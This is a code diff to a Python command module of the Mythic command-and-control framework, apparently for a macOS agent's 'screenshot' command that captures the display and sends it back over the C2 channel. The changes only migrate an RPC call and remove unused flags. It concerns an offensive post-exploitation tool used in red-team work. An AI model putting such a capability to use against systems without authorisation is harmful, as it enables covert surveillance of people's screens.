@@ -1,7 +1,7 @@
 from mythic_payloadtype_container.MythicCommandBase import *
 import json
 import datetime
-from mythic_payloadtype_container.MythicResponseRPC import *
+from mythic_payloadtype_container.MythicRPC import *
 from mythic_payloadtype_container.PayloadBuilder import *
 
 
@@ -20,12 +20,6 @@ class ScreenshotCommand(CommandBase):
     help_cmd = "screenshot"
     description = "Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel. No need to specify any parameters as the current time will be used as the file name"
     version = 1
-    is_exit = False
-    is_file_browse = False
-    is_process_list = False
-    is_download_file = False
-    is_remove_file = False
-    is_upload_file = False
     author = "@its_a_feature_"
     parameters = []
     attackmapping = ["T1113"]
@@ -35,8 +29,8 @@ class ScreenshotCommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         task.args.command_line += str(datetime.datetime.utcnow())
-        resp = await MythicResponseRPC(task).register_artifact(
-            artifact_instance="$.CGDisplayCreateImage($.CGMainDisplayID());, $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);",
+        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
+            artifact="$.CGDisplayCreateImage($.CGMainDisplayID());, $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);",
             artifact_type="API Called",
         )
         return task
